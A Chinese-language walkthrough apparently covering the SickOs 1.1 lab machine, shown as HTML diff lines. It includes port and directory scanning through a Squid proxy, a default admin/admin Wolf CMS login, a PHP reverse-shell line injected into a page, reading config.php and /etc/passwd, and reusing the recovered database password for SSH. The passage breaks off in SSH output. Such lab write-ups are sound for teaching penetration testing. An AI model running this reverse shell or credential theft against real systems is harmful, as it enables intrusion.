+</span></span><span class="line"><span class="cl">22/udp   open|filtered ssh
+</span></span><span class="line"><span class="cl">3128/udp open|filtered ndl-aas
+</span></span><span class="line"><span class="cl">8080/udp open|filtered http-alt
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:E9:D0:28 (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="vuln脚本扫描">vuln脚本扫描</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">└─$ sudo nmap -script=vuln -p80,3128,8080 192.168.152.135
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 04:01 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.135
+</span></span><span class="line"><span class="cl">Host is up (0.00042s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE
+</span></span><span class="line"><span class="cl">80/tcp   filtered http
+</span></span><span class="line"><span class="cl">3128/tcp open     squid-http
+</span></span><span class="line"><span class="cl">8080/tcp closed   http-proxy
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:E9:D0:28 (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再尝试一下目录爆破</p>
+<h3 id="目录爆破">目录爆破</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ dirsearch -u 192.168.152.135                                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span class="line"><span class="cl"> (_||| _) (/_(_|| (_| )
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-18_04-02-33.txt
+</span></span><span class="line"><span class="cl">^[[B^[[B^[[B^[[B^[[B^[[B
+</span></span><span class="line"><span class="cl">Target: http://192.168.152.135/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[04:02:39] Starting:                                                                        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Request timeout: http://192.168.152.135/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Task Completed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>请求超时，很明显我们使用的是本地实验环境，在局域网中出现这种请求超时明显是不正常的，通过前面的一些提示，也足以联想到是否与之前8080端口显示的代理相关</p>
+<p>所以尝试使用3128端口的代理去再重新扫一次</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ dirsearch -u 192.168.152.135 --proxy 192.168.152.135:3128
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span class="line"><span class="cl"> (_||| _) (/_(_|| (_| )
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-20_05-18-25.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.152.135/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[05:18:31] Starting: 
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  245B  - /.ht_wsr.txt                                  
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  243B  - /.htaccess.bak1                               
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  244B  - /.htaccess.sample                             
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  242B  - /.htaccess.save                               
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  243B  - /.htaccess.orig
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  244B  - /.htaccess_orig                               
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  242B  - /.htaccessOLD
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  243B  - /.htaccess_sc
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  243B  - /.htaccessOLD2                                
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  239B  - /.html                                        
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  239B  - /.htm
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  242B  - /.htaccessBAK
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  243B  - /.httr-oauth                                  
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  247B  - /.htpasswd_test
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  245B  - /.htaccess_extra                              
+</span></span><span class="line"><span class="cl">[05:18:33] 403 -  243B  - /.htpasswds                                   
+</span></span><span class="line"><span class="cl">[05:18:46] 403 -  242B  - /cgi-bin/                                     
+</span></span><span class="line"><span class="cl">[05:18:48] 200 -  109B  - /connect                                      
+</span></span><span class="line"><span class="cl">[05:18:50] 403 -  241B  - /doc/api/                                     
+</span></span><span class="line"><span class="cl">[05:18:50] 403 -  246B  - /doc/html/index.html
+</span></span><span class="line"><span class="cl">[05:18:50] 403 -  239B  - /doc/
+</span></span><span class="line"><span class="cl">[05:18:50] 403 -  248B  - /doc/en/changes.html                          
+</span></span><span class="line"><span class="cl">[05:18:50] 403 -  247B  - /doc/stable.version
+</span></span><span class="line"><span class="cl">[05:19:05] 200 -   58B  - /robots.txt                                   
+</span></span><span class="line"><span class="cl">[05:19:06] 403 -  243B  - /server-status                                
+</span></span><span class="line"><span class="cl">[05:19:06] 403 -  243B  - /server-status/                               
+</span></span><span class="line"><span class="cl">                                                                         
+</span></span><span class="line"><span class="cl">Task Completed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这次成功扫出了基础的信息</p>
+<h2 id="web渗透">web渗透</h2>
+<p>将浏览器的代理设置到刚刚的ip和端口</p>
+<p>访问到robots.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /
+</span></span><span class="line"><span class="cl">Dissalow: /wolfcms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现存在wolfcms的信息</p>
+<p>访问connect，发现存在一些信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">#!/usr/bin/python
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print &#34;I Try to connect things very frequently\n&#34;
+</span></span><span class="line"><span class="cl">print &#34;You may want to try my services&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过搜索引擎找到一个管理员路径/wolfcms/?/admin</p>
+<p>尝试弱口令，如果无果则选择爆破</p>
+<p>通过admin，admin成功登录</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-iDpqszw1FNnLmTR-20250303144338-f8ch0ec.png" alt="">​</p>
+<p>发现很多页面都存在可执行的php代码，尝试插入一段代码，一句话木马或者反弹shell都行</p>
+<p>将这段代码插入页面，然后开一个监听端口，访问刚刚编辑后的页面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;?php exec(&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.152.131/1234 0&gt;&amp;1&#39;&#34;); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到一个权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ nc -lnvp 1234   
+</span></span><span class="line"><span class="cl">listening on [any] 1234 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.152.131] from (UNKNOWN) [192.168.152.135] 53138
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@SickOs:/var/www/wolfcms$ whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl">www-data@SickOs:/var/www/wolfcms$ uname -a
+</span></span><span class="line"><span class="cl">uname -a
+</span></span><span class="line"><span class="cl">Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 athlon i386 GNU/Linux
+</span></span><span class="line"><span class="cl">www-data@SickOs:/var/www/wolfcms$ ip a
+</span></span><span class="line"><span class="cl">ip a
+</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN 
+</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="cl">    inet6 ::1/128 scope host 
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
+</span></span><span class="line"><span class="cl">    link/ether 00:0c:29:e9:d0:28 brd ff:ff:ff:ff:ff:ff
+</span></span><span class="line"><span class="cl">    inet 192.168.152.135/24 brd 192.168.152.255 scope global eth0
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="cl">    inet6 fe80::20c:29ff:fee9:d028/64 scope link 
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在开始查找办法</p>
+<p>查看当前目录，并且发现存在一个config.php文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span><span class="lnt">98
+</span><span class="lnt">99
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">www-data@SickOs:/var/www/wolfcms$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">CONTRIBUTING.md
+</span></span><span class="line"><span class="cl">README.md
+</span></span><span class="line"><span class="cl">composer.json
+</span></span><span class="line"><span class="cl">config.php
+</span></span><span class="line"><span class="cl">docs
+</span></span><span class="line"><span class="cl">favicon.ico
+</span></span><span class="line"><span class="cl">index.php
+</span></span><span class="line"><span class="cl">public
+</span></span><span class="line"><span class="cl">robots.txt
+</span></span><span class="line"><span class="cl">wolf
+</span></span><span class="line"><span class="cl">www-data@SickOs:/var/www/wolfcms$ cat config.php
+</span></span><span class="line"><span class="cl">cat config.php
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Database information:
+</span></span><span class="line"><span class="cl">// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+</span></span><span class="line"><span class="cl">// The path can only be absolute path or :memory:
+</span></span><span class="line"><span class="cl">// For more info look at: www.php.net/pdo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Database settings:
+</span></span><span class="line"><span class="cl">define(&#39;DB_DSN&#39;, &#39;mysql:dbname=wolf;host=localhost;port=3306&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;DB_USER&#39;, &#39;root&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;TABLE_PREFIX&#39;, &#39;&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Should Wolf produce PHP error messages for debugging?
+</span></span><span class="line"><span class="cl">define(&#39;DEBUG&#39;, false);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Should Wolf check for updates on Wolf itself and the installed plugins?
+</span></span><span class="line"><span class="cl">define(&#39;CHECK_UPDATES&#39;, true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// The number of seconds before the check for a new Wolf version times out in case of problems.
+</span></span><span class="line"><span class="cl">define(&#39;CHECK_TIMEOUT&#39;, 3);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// The full URL of your Wolf CMS install
+</span></span><span class="line"><span class="cl">define(&#39;URL_PUBLIC&#39;, &#39;/wolfcms/&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Use httpS for the backend?
+</span></span><span class="line"><span class="cl">// Before enabling this, please make sure you have a working HTTP+SSL installation.
+</span></span><span class="line"><span class="cl">define(&#39;USE_HTTPS&#39;, false);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
+</span></span><span class="line"><span class="cl">// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
+</span></span><span class="line"><span class="cl">// Defaults to false for backwards compatibility.
+</span></span><span class="line"><span class="cl">define(&#39;COOKIE_HTTP_ONLY&#39;, false);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// The virtual directory name for your Wolf CMS administration section.
+</span></span><span class="line"><span class="cl">define(&#39;ADMIN_DIR&#39;, &#39;admin&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Change this setting to enable mod_rewrite. Set to &#34;true&#34; to remove the &#34;?&#34; in the URL.
+</span></span><span class="line"><span class="cl">// To enable mod_rewrite, you must also change the name of &#34;_.htaccess&#34; in your
+</span></span><span class="line"><span class="cl">// Wolf CMS root directory to &#34;.htaccess&#34;
+</span></span><span class="line"><span class="cl">define(&#39;USE_MOD_REWRITE&#39;, false);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Add a suffix to pages (simluating static pages &#39;.html&#39;)
+</span></span><span class="line"><span class="cl">define(&#39;URL_SUFFIX&#39;, &#39;.html&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Set the timezone of your choice.
+</span></span><span class="line"><span class="cl">// Go here for more information on the available timezones:
+</span></span><span class="line"><span class="cl">// http://php.net/timezones
+</span></span><span class="line"><span class="cl">define(&#39;DEFAULT_TIMEZONE&#39;, &#39;Asia/Calcutta&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Use poormans cron solution instead of real one.
+</span></span><span class="line"><span class="cl">// Only use if cron is truly not available, this works better in terms of timing
+</span></span><span class="line"><span class="cl">// if you have a lot of traffic.
+</span></span><span class="line"><span class="cl">define(&#39;USE_POORMANSCRON&#39;, false);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Rough interval in seconds at which poormans cron should trigger.
+</span></span><span class="line"><span class="cl">// No traffic == no poormans cron run.
+</span></span><span class="line"><span class="cl">define(&#39;POORMANSCRON_INTERVAL&#39;, 3600);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// How long should the browser remember logged in user?
+</span></span><span class="line"><span class="cl">// This relates to Login screen &#34;Remember me for xxx time&#34; checkbox at Backend Login screen
+</span></span><span class="line"><span class="cl">// Default: 1800 (30 minutes)
+</span></span><span class="line"><span class="cl">define (&#39;COOKIE_LIFE&#39;, 1800);  // 30 minutes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Can registered users login to backend using their email address?
+</span></span><span class="line"><span class="cl">// Default: false
+</span></span><span class="line"><span class="cl">define (&#39;ALLOW_LOGIN_WITH_EMAIL&#39;, false);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Should Wolf CMS block login ability on invalid password provided?
+</span></span><span class="line"><span class="cl">// Default: true
+</span></span><span class="line"><span class="cl">define (&#39;DELAY_ON_INVALID_LOGIN&#39;, true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// How long should the login blockade last?
+</span></span><span class="line"><span class="cl">// Default: 30 seconds
+</span></span><span class="line"><span class="cl">define (&#39;DELAY_ONCE_EVERY&#39;, 30); // 30 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// First delay starts after Nth failed login attempt
+</span></span><span class="line"><span class="cl">// Default: 3
+</span></span><span class="line"><span class="cl">define (&#39;DELAY_FIRST_AFTER&#39;, 3);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Secure token expiry time (prevents CSRF attacks, etc.)
+</span></span><span class="line"><span class="cl">// If backend user does nothing for this time (eg. click some link) 
+</span></span><span class="line"><span class="cl">// his token will expire with appropriate notification
+</span></span><span class="line"><span class="cl">// Default: 900 (15 minutes)
+</span></span><span class="line"><span class="cl">define (&#39;SECURE_TOKEN_EXPIRY&#39;, 900);  // 15 minutes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现存在一个账户密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">define(&#39;DB_USER&#39;, &#39;root&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看一下当前的用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">www-data@SickOs:/var/www/wolfcms$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/bin/sh
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/bin/sh
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/bin/sh
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/bin/sh
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/bin/sh
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/bin/sh
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/bin/sh
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/bin/sh
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/bin/sh
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span></span><span class="line"><span class="cl">libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span></span><span class="line"><span class="cl">syslog:x:101:103::/home/syslog:/bin/false
+</span></span><span class="line"><span class="cl">messagebus:x:102:105::/var/run/dbus:/bin/false
+</span></span><span class="line"><span class="cl">whoopsie:x:103:106::/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">landscape:x:104:109::/var/lib/landscape:/bin/false
+</span></span><span class="line"><span class="cl">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+</span></span><span class="line"><span class="cl">mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>挨个尝试是否能通过密码进行ssh登录操作</p>
+<p>成功登录上sickos用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ ssh sickos@192.168.152.135
+</span></span><span class="line"><span class="cl">The authenticity of host &#39;192.168.152.135 (192.168.152.135)&#39; can&#39;t be established.
+</span></span><span class="line"><span class="cl">ECDSA key fingerprint is SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8.
